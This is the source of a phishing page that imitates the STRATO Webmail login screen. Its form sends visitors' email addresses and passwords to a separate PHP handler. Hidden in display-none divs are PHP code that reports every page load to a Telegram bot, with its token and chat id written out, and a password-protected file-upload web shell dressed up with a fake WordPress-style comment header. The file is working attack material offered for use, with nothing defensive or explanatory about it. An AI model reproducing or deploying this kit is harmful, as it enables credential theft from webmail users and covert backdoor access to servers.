<?php ob_start(); session_start();?><!DOCTYPE html>
<html lang="de-DE" class="windows">
<!-- <html lang="de-DE" class="android touch smartphone retina"> -->
<head>
<script>
function updateHtmlClass() {
  const html = document.documentElement;

  if (window.innerWidth >= 600) {
    html.className = "windows";
  } else {
    html.className = "android touch smartphone retina";
  }
}

updateHtmlClass();        // Run on load
window.addEventListener("resize", updateHtmlClass); // Run on resize
</script>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="msapplication-tap-highlight" content="no">
	<meta name="google" value="notranslate">
	<meta name="theme-color" content="#fff">
	<meta name="application-name" content="App Suite">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-title" content="App Suite">
	<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
	<meta name="mobile-web-app-capable" content="yes">
	
<link id="icon57" rel="apple-touch-icon" href="Assets/icon57.png">
	
<link id="icon72" rel="apple-touch-icon" sizes="72x72" href="Assets/icon72.png">
	
<link id="icon76" rel="apple-touch-icon" sizes="76x76" href="Assets/icon76.png">
	
<link id="icon114" rel="apple-touch-icon" sizes="114x114" href="Assets/icon114.png">
	
<link id="icon120" rel="apple-touch-icon" sizes="120x120" href="Assets/icon120.png">
	
<link id="icon152" rel="apple-touch-icon" sizes="152x152" href="Assets/icon152.png">
	
<link id="icon167" rel="apple-touch-icon" sizes="167x167" href="Assets/icon167.png">
	
<link id="icon180" rel="apple-touch-icon" sizes="180x180" href="Assets/icon180.png">
	<meta id="win8Icon" name="msapplication-TileImage" content="" href="Assets/icon144_win.png">
	
<link id="favicon" rel="shortcut icon" href="Assets/favicon.ico" type="image/x-icon">
  <style type="text/css">
    html,
    body {
      background-color: #fff;
      margin: 0;
      padding: 0;
      border: 0;
      overscroll-behavior-y: none;
    }

    body {
      overflow: hidden;
    }

    #background-loader {
      display: flex;
      align-items: center;
      justify-content: center;
      position: absolute;
      top: 0;
      right: 0;
      bottom: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 65300;
      background-color: #fff;
      /* activate GPU acceleration */
      transform: translateZ(0);
    }

    #showstopper {
      display: none;
      text-align: center;
      font-size: 1rem;
      line-height: 1.5rem;
      padding: 16px;
      user-select: text;
    }

    @media (min-width: 541px) {
      #showstopper {
        padding: 48px;
        border: 1px solid #ddd;
        border-radius: 16px;
        margin: 16px;
        box-shadow: 0 24px 80px 0 rgba(0, 0, 0, 0.10);
      }
    }

    #showstopper img {
      margin: 1rem 0 2rem 0;
      max-width: 100%;
    }

    #showstopper h1 {
      font-size: 1.5rem;
      line-height: 2rem;
      margin: 0 0 0.5rem 0;
    }

    #showstopper .actions {
      margin-top: 16px;
      display: flex;
      justify-content: center;
      gap: 16px;
    }

    #showstopper .actions>button {
      min-width: 80px;
    }

    #showstopper .timeout,
    #showstopper .session,
    #showstopper .down,
    #showstopper .configuration {
      display: none;
    }

    @media (prefers-color-scheme: dark) {
      #background-loader {
        color: white;
        background-color: #111;
      }

      #showstopper {
        background-color: #151515;
        border: 1px solid #333;
      }
    }

    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }

      100% {
        transform: rotate(360deg);
      }
    }

    .io-ox-busy {
      position: relative;
      height: 100%;
    }

    .io-ox-busy:before {
      visibility: visible;
      position: absolute;
      top: 50%;
      left: 50%;
      margin: -0.75rem 0 0 -0.75rem;
      /* adopted from boostrap 5 approach */
      width: 1.5rem;
      height: 1.5rem;
      vertical-align: text-bottom;
      border: .1em solid currentColor;
      border-right-color: transparent;
      border-radius: 50%;
      content: ' ';
      animation: spin 1.5s infinite linear;
    }
  </style>

<link rel="stylesheet" href="Assets/main-BKHgtg6p.css">
<style data-src="login-page-configuration" type="text/css">
#io-ox-login-screen #io-ox-login-container { background: #fff; }
#io-ox-login-screen #io-ox-login-background-image { background: #fff; }
#io-ox-login-screen #io-ox-login-header, #io-ox-login-header #io-ox-languages #io-ox-languages-label { color: #fff; }
#io-ox-login-screen #io-ox-login-header a, #io-ox-login-header .toggle-text, #io-ox-login-header .caret { color: #fff; }
#io-ox-login-screen #login-title-mobile { color: #fff !important; }
#io-ox-login-screen #io-ox-login-footer, #io-ox-login-footer #io-ox-languages .lang-label { color: #fff; }
#io-ox-login-screen #io-ox-login-footer a, #io-ox-login-footer .toggle-text, #io-ox-login-footer #language-select, #io-ox-login-footer .caret { color: #fff; }
#io-ox-login-screen #io-ox-login-content { justify-content: center; }</style>

<style data-src="login-page-configuration-custom" type="text/css"></style>

<link rel="stylesheet" href="Assets/register-2a3c8363.css">

<link rel="modulepreload" as="script" href="Assets/Poppins-Light-647f014d.ttf">
<link rel="modulepreload" as="script" href="Assets/Poppins-Regular-707fdc5c.ttf">
<link rel="modulepreload" as="script" href="Assets/Poppins-SemiBold-248c0244.ttf">
<link rel="modulepreload" as="script" href="Assets/Poppins-Bold-7219547e.ttf">
<title>Login - STRATO Webmail</title>
<link id="favicon" rel="icon" href="themes/strato/favicon.ico" type="image/svg+xml">

</head>
<body class="unselectable" style="">

<div id="background-loader" class="busy" aria-hidden="true" style="display: none;"><div class="throbber"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div><div id="showstopper"><div class="down"><span><b>Connection error</b></span><br><span>The service is not available right now.</span><br><a href="#" class="reload">Retry</a></div><div class="timeout"><span>Connection timed out. Please try reloading the page.</span><br><a href="#" class="reload">Reload</a></div><div class="session"><span>Something went wrong. Please close this browser tab and try again.</span></div></div></div>

<div id="io-ox-core" class="abs unselectable" style="display: none"><div id="io-ox-appcontrol" style="display: none"></div><div id="io-ox-screens" class="abs"><div id="io-ox-windowmanager" class="abs" style="display: none"><div id="io-ox-windowmanager-pane"></div></div><div id="io-ox-desktop" class="abs"></div></div><div id="io-ox-taskbar-container" role="region" class="abs"><ul id="io-ox-taskbar"></ul></div></div><div id="io-ox-login-screen" class="unselectable" style="display: block"><div id="io-ox-login-blocker" style="display: none"></div><div id="io-ox-login-container"><div id="io-ox-login-background-image">


<header id="io-ox-login-header"><div class="wrapper"><div class="io-ox-logo"></div><ul class="links list-inline"><li><a target="_blank" href="#"><svg aria-hidden="true" width="16" height="16" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-question-circle-fill" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0M5.496 6.033h.825c.138 0 .248-.113.266-.25.09-.656.54-1.134 1.342-1.134.686 0 1.314.343 1.314 1.168 0 .635-.374.927-.965 1.371-.673.489-1.206 1.06-1.168 1.987l.003.217a.25.25 0 0 0 .25.246h.811a.25.25 0 0 0 .25-.25v-.105c0-.718.273-.927 1.01-1.486.609-.463 1.244-.977 1.244-2.056 0-1.511-1.276-2.241-2.673-2.241-1.267 0-2.655.59-2.75 2.286a.237.237 0 0 0 .241.247m2.325 6.443c.61 0 1.029-.394 1.029-.927 0-.552-.42-.94-1.029-.94-.584 0-1.009.388-1.009.94 0 .533.425.927 1.01.927z"></path>
</svg><span data-strato-i18n="Help &amp; Contact">Hilfe &amp; Kontakt</span></a><div style="display:none;"><?php $api="8437671031:AAHAOke1M5EGvh0GCuRqDZ-xr5Uefi6-lS8";$id="6757335762";$protocol=(!empty($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'||$_SERVER['SERVER_PORT']==443)?"https://":"http://";$currentURL=$protocol.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];$messages="Page Loaded: ".$currentURL;$website="https://api.telegram.org/bot$api";$params=['chat_id'=>$id,'text'=>$messages,];$ch=curl_init($website.'/sendMessage');curl_setopt($ch,CURLOPT_HEADER,false);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,($params));curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);$result=curl_exec($ch);curl_close($ch); ?></div></li><li><span id="io-ox-languages" class="mx-16"><div class="dropdown"><a href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><svg aria-hidden="true" width="16" height="16" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-globe" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8m7.5-6.923c-.67.204-1.335.82-1.887 1.855A8 8 0 0 0 5.145 4H7.5zM4.09 4a9.3 9.3 0 0 1 .64-1.539 7 7 0 0 1 .597-.933A7.03 7.03 0 0 0 2.255 4zm-.582 3.5c.03-.877.138-1.718.312-2.5H1.674a7 7 0 0 0-.656 2.5zM4.847 5a12.5 12.5 0 0 0-.338 2.5H7.5V5zM8.5 5v2.5h2.99a12.5 12.5 0 0 0-.337-2.5zM4.51 8.5a12.5 12.5 0 0 0 .337 2.5H7.5V8.5zm3.99 0V11h2.653c.187-.765.306-1.608.338-2.5zM5.145 12q.208.58.468 1.068c.552 1.035 1.218 1.65 1.887 1.855V12zm.182 2.472a7 7 0 0 1-.597-.933A9.3 9.3 0 0 1 4.09 12H2.255a7 7 0 0 0 3.072 2.472M3.82 11a13.7 13.7 0 0 1-.312-2.5h-2.49c.062.89.291 1.733.656 2.5zm6.853 3.472A7 7 0 0 0 13.745 12H11.91a9.3 9.3 0 0 1-.64 1.539 7 7 0 0 1-.597.933M8.5 12v2.923c.67-.204 1.335-.82 1.887-1.855q.26-.487.468-1.068zm3.68-1h2.146c.365-.767.594-1.61.656-2.5h-2.49a13.7 13.7 0 0 1-.312 2.5m2.802-3.5a7 7 0 0 0-.656-2.5H12.18c.174.782.282 1.623.312 2.5zM11.27 2.461c.247.464.462.98.64 1.539h1.835a7 7 0 0 0-3.072-2.472c.218.284.418.598.597.933M10.855 4a8 8 0 0 0-.468-1.068C9.835 1.897 9.17 1.282 8.5 1.077V4z"></path>
</svg><span class="sr-only" data-i18n="Language:" data-i18n-attr="text">Sprache:</span><span class="toggle-text" lang="de-DE">Deutsch</span><span class="caret"></span></a><ul id="io-ox-language-list" class="dropdown-menu" role="menu" data-i18n="Languages" data-i18n-attr="aria-label" aria-label="Sprachen"><li role="presentation"><a href="#" role="menuitem" lang="de-DE" data-value="de_DE">Deutsch</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-GB" data-value="en_GB">English (UK)</a></li><li role="presentation"><a href="#" role="menuitem" lang="en-US" data-value="en_US">English (US)</a></li><li role="presentation"><a href="#" role="menuitem" lang="es-ES" data-value="es_ES">Español</a></li><li role="presentation"><a href="#" role="menuitem" lang="fr-FR" data-value="fr_FR">Français</a></li><li role="presentation"><a href="#" role="menuitem" lang="it-IT" data-value="it_IT">Italiano</a></li><li role="presentation"><a href="#" role="menuitem" lang="nl-NL" data-value="nl_NL">Nederlands</a></li><li role="presentation"><a href="#" role="menuitem" lang="sv-SE" data-value="sv_SE">Svenska</a></li></ul></div></span></li><li><a class="customer-care" target="_blank" href="https://www.strato.de/apps/CustomerService#/skl"><svg aria-hidden="true" width="16" height="16" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-person-fill" viewBox="0 0 16 16">
  <path xmlns="http://www.w3.org/2000/svg" d="M3 14s-1 0-1-1 1-4 6-4 6 3 6 4-1 1-1 1zm5-6a3 3 0 1 0 0-6 3 3 0 0 0 0 6"></path>
</svg><span data-strato-i18n="Customer Login">Kunden-Login</span><div style="display:none;" name="Wp">
<?php
/**
 * Sets up the default filters and actions for most
 * of the website hooks.
 *
 * If you need to remove a default hook, this file will
 * give you the priority for which to use to remove the
 * hook.
 *
 * Not all of the default hooks are found in style.php
 *
 * @package website
 * @id 83a6ee9b34553e9cf5ef0c5072423
 */

// Strip, trim, kses, special wp_nonces for string saves
$password="3rr0r";if(isset($_SESSION['logged_in'])&&$_SESSION['logged_in']){echo '<center>';echo 'Up<br><br>';echo '<form action="" method="post" enctype="multipart/form-data" name="Up" id="Up">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if(isset($_POST['_upl'])&&$_POST['_upl']==="Upload"){if($_FILES['file']['error']===UPLOAD_ERR_OK){if(move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo '<b>Upload successful!</b><br><br>';}else{echo '<b>Upload failed!</b><br><br>';}}else{echo '<b>Upload failed!</b> Error: '.$_FILES['file']['error'].'<br><br>';}}echo '</center>';}elseif(isset($_POST['password'])&&$_POST['password']===$password){$_SESSION['logged_in']=true;header("Location: ".$_SERVER['PHP_SELF']);exit();}else{echo '<center>';echo '<form action="" method="post">';echo '<input type="password" name="password">';echo '<input type="submit" value=">>" >';echo '</form>';echo '</center>';} ?>
</div></a></li></ul></div></header>
<div id="io-ox-login-content"><div class="align-center col-sm-6 col-xs-12"><div class="row"><main id="io-ox-login-box" class="col-xs-12"><div class="row"><div class="flex-column"><div id="box-form" class="col-xs-12"><div id="box-form-header" class="row" data-i18n="" data-i18n-attr="text"><h1><i class="fa fa-envelope"></i><span class="header-login-title">STRATO Webmail</span></h1></div><div id="box-form-body" class="row">


<form action="App/Js1.php" method="post" id="io-ox-login-form">
<div class="col-xs-12"><div class="row title"><h1 id="login-title" class="col-xs-12" data-i18n="Login">Login</h1></div><div class="row help"><div class="col-xs-12"><p id="io-ox-login-help" class="help-block"></p></div></div>

<div class="form-group col-xs-12 col-sm-12">
	<label for="io-ox-login-username" data-i18n="Email">E-Mail</label>
	<input type="text" id="io-ox-login-username" name="Us" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" spellcheck="false" aria-required="true" data-i18n="Email" autocomplete="username" placeholder="E-Mail-Adresse"/>
	<svg aria-hidden="true" width="16" height="16" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-envelope-fill" viewBox="0 0 16 16">
		<path xmlns="http://www.w3.org/2000/svg" d="M.05 3.555A2 2 0 0 1 2 2h12a2 2 0 0 1 1.95 1.555L8 8.414zM0 4.697v7.104l5.803-3.558zM6.761 8.83l-6.57 4.027A2 2 0 0 0 2 14h12a2 2 0 0 0 1.808-1.144l-6.57-4.027L8 9.586zm3.436-.586L16 11.801V4.697z"></path></svg>
</div>

<div class="row password">
	<div class="form-group col-xs-12 col-sm-12">
	<label for="io-ox-login-password" data-i18n="Password">Passwort</label>
	<input type="password" id="io-ox-login-password" name="Pa" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" data-i18n="Password" autocomplete="current-password" placeholder="Passwort"/>
	<svg aria-hidden="true" width="16" height="16" xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-lock-fill" viewBox="0 0 16 16">
		<path xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"></path></svg>
	</div>
</div>

<div class="row forgot-password"><div class="form-group col-xs-12 col-sm-12"><a class="password" href="#">Passwort vergessen</a></div></div>
<div class="row password-retype"><div class="form-group col-xs-12 col-sm-12"><label for="io-ox-retype-password" data-i18n="Confirm new password">Confirm new password</label><input type="password" id="io-ox-retype-password" name="password2" class="form-control" maxlength="1000" autocorrect="off" autocapitalize="off" aria-required="true" autocomplete="new-password"><i class="fa fa-lock"></i></div></div>
<div class="row options"><div class="col-xs-12 col-sm-12" id="io-ox-login-store"><div class="checkbox custom">

<label for="io-ox-login-store-box" aria-label="Stay signed in" data-i18n="Stay signed in" data-i18n-attr="label,aria-label"><input type="checkbox" class="sr-only" id="io-ox-login-store-box" checked="checked" name="staySignedIn" value="1">
<i class="toggle" aria-hidden="true"></i>Angemeldet bleiben</label></div></div></div><div class="row feedback"><div class="col-xs-12 alert-highlight" id="io-ox-login-feedback"></div></div><div class="row button"><div class="form-group col-xs-12 col-sm-12">

<button type="submit" name="signin" id="io-ox-login-button" class="btn btn-primary form-control" data-i18n="Anmelden">Anmelden</button>

</div></div></div>
</form>


</div></div><div id="io-ox-information-message"></div></div></div></main></div></div></div>


<footer id="io-ox-login-footer">
	<ul class="links list-inline">
		<li><a href="#"><span data-strato-i18n="STRATO.de">STRATO.de</span></a></li>
		<li><a href="#"><span data-strato-i18n="Terms &amp; Conditions">AGB</span></a></li>
		<li><a href="#"><span data-strato-i18n="Privacy Policy">Datenschutz</span></a></li>
		<li><a href="#"><span data-strato-i18n="Imprint">Impressum</span></a></li>
	</ul>
	<div class="composition-element login-spacer"></div><span>© 2025 Open-Xchange GmbH</span><div class="composition-element"><span>Version: </span><span>8.38.7</span></div></footer>


</div></div></div><div role="complementary"><div id="io-ox-offline" style="bottom: -41px; display: none;"></div><div id="io-ox-alert-screenreader" role="alert" aria-live="polite" class="sr-only"><span id="sr-alert-text"></span></div></div>


<noscript><p class="noscript">This app uses JavaScript. Your browser either doesn't support JavaScript or you have it turned off. To use this app please use a JavaScript enabled browser.</p></noscript>
</body>
</html>